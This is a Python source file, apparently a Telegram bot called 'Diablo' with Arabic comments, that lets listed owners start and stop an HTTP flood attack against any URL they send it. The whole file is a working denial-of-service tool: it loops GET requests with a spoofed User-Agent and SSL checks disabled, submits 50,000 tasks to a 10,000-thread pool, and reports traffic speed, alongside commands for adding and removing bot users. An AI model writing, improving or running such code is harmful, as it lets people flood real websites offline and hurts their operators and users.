import requests
import threading
import urllib3
import time
from concurrent.futures import ThreadPoolExecutor
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# تعطيل التحقق من صحة شهادة SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

fake_ip = '182.21.20.32'

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
}

# إنشاء جلسة واحدة للاستخدام المتكرر
session = requests.Session()
session.verify = False

# متغير لتخزين عدد البايتات المنقولة
bytes_transferred = 0
lock = threading.Lock()

# متغير لإيقاف الهجوم
stop_attack_event = threading.Event()

# قائمة المالكين
Owner = ['6358035274']

# قائمة المستخدمين العاديين
NormalUsers = ['5708651947']

# قراءة القوائم من الملفات
def load_lists():
    global Owner, NormalUsers
    try:
        with open('owner.txt', 'r') as file:
            Owner = file.read().splitlines()
        with open('normal_users.txt', 'r') as file:
            NormalUsers = file.read().splitlines()
    except FileNotFoundError:
        pass

load_lists()

def attack(url, session):
    global bytes_transferred
    while not stop_attack_event.is_set():
        try:
            response = session.get(url, headers=headers)
            with lock:
                bytes_transferred += len(response.content)
            print("تم إرسال الطلب إلى:", url)
        except Exception as e:
            print("حدث خطأ:", e)

def start_attack(url):
    stop_attack_event.clear()
    options = [session] * 50  # استخدام قائمة من الجلسات المحتملة للهجوم
    with ThreadPoolExecutor(max_workers=10000) as executor:
        for _ in range(50000):  # زيادة عدد المحاولات بمقدار 10 أضعاف
            executor.submit(attack, url, options[_ % 50])

def stop_attack():
    stop_attack_event.set()
    print("تم إيقاف الهجوم.")

def calculate_speed():
    global bytes_transferred
    while not stop_attack_event.is_set():
        time.sleep(1)
        with lock:
            speed = bytes_transferred / (1024 * 1024)
            bytes_transferred = 0
        print(f"سرعة النقل: {speed:.2f} MB/s")

# إنشاء البوت باستخدام التوكن الخاص بك
TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'
bot = telebot.TeleBot(TOKEN)

# تحقق من صحة المالك
def is_owner(user_id):
    return str(user_id) in Owner

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if is_owner(message.from_user.id):
        bot.reply_to(message, "مرحبًا بك في بوت ديابلو! استخدم القائمة أدناه لاختيار الأوامر.")
    else:
        bot.reply_to(message, "أنت لا تملك الصلاحيات الكافية لاستخدام هذا البوت.")

    # إنشاء الأزرار التفاعلية إذا كان المستخدم مالكًا
    if is_owner(message.from_user.id):
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("إضافة مستخدم", callback_data="add_user"))
        markup.add(InlineKeyboardButton("إزالة مستخدم", callback_data="remove_user"))
        markup.add(InlineKeyboardButton("بدء هجوم", callback_data="start_attack"))
        markup.add(InlineKeyboardButton("إيقاف الهجوم", callback_data="stop_attack"))
        bot.send_message(message.chat.id, "اختر أحد الأوامر:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if is_owner(call.message.chat.id):
        if call.data == "add_user":
            msg = bot.send_message(call.message.chat.id, "أدخل معرف المستخدم لإضافته:")
            bot.register_next_step_handler(msg, process_add_user)
        elif call.data == "remove_user":
            msg = bot.send_message(call.message.chat.id, "أدخل معرف المستخدم لإزالته:")
            bot.register_next_step_handler(msg, process_remove_user)
        elif call.data == "start_attack":
            msg = bot.send_message(call.message.chat.id, "أدخل رابط الهدف لبدء الهجوم:")
            bot.register_next_step_handler(msg, process_start_attack)
        elif call.data == "stop_attack":
            stop_attack()
            bot.send_message(call.message.chat.id, "تم إيقاف الهجوم.")
    else:
        bot.send_message(call.message.chat.id, "أنت لا تملك الصلاحيات الكافية لاستخدام هذا البوت.")

def process_add_user(message):
    # إضافة المستخدم إلى القائمة
    new_user = message.text.strip()
    if new_user not in NormalUsers:
        NormalUsers.append(new_user)
        with open('normal_users.txt', 'a') as file:
            file.write(f"{new_user}\n")
        bot.reply_to(message, f"تمت إضافة المستخدم: {new_user}")
    else:
        bot.reply_to(message, "المستخدم موجود بالفعل في القائمة.")

def process_remove_user(message):
    # إزالة المستخدم من القائمة
    user_to_remove = message.text.strip()
    if user_to_remove in NormalUsers:
        NormalUsers.remove(user_to_remove)
        with open('normal_users.txt', 'w') as file:
            for user in NormalUsers:
                file.write(f"{user}\n")
        bot.reply_to(message, f"تمت إزالة المستخدم: {user_to_remove}")
    else:
        bot.reply_to(message, "المستخدم غير موجود في القائمة.")

def process_start_attack(message):
    url = message.text.strip()
    if url:
        bot.reply_to(message, f"بدء الهجوم على: {url}")

        # بدء خيط حساب السرعة
        speed_thread = threading.Thread(target=calculate_speed)
        speed_thread.daemon = True
        speed_thread.start()

        # بدء الهجوم في خيط منفصل
        attack_thread = threading.Thread(target=start_attack, args=(url,))
        attack_thread.start()
    else:
        bot.reply_to(message, "لم يتم إدخال رابط الهدف بشكل صحيح.")

def main():
    bot.polling()

if __name__ == '__main__':
    main()
